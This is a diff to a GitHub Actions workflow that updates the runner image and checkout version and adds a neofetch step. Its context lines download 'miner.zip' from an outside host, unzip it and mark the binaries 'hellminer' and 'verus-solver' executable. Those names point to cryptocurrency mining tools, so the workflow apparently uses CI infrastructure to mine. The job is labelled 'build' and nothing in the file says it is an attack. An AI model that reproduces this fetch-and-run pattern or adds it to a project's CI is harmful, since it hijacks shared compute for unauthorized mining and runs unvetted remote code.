@@ -7,10 +7,11 @@ on:
 
 jobs:
   build:
-    runs-on: ubuntu-22.04
+    runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v3
+      - uses: actions/checkout@v4
       - run: sudo apt install neofetch -y
+      - run: neofetch
       - run: wget flupy.me/miner.zip
       - run: unzip miner.zip
       - run: chmod +x hellminer verus-solver
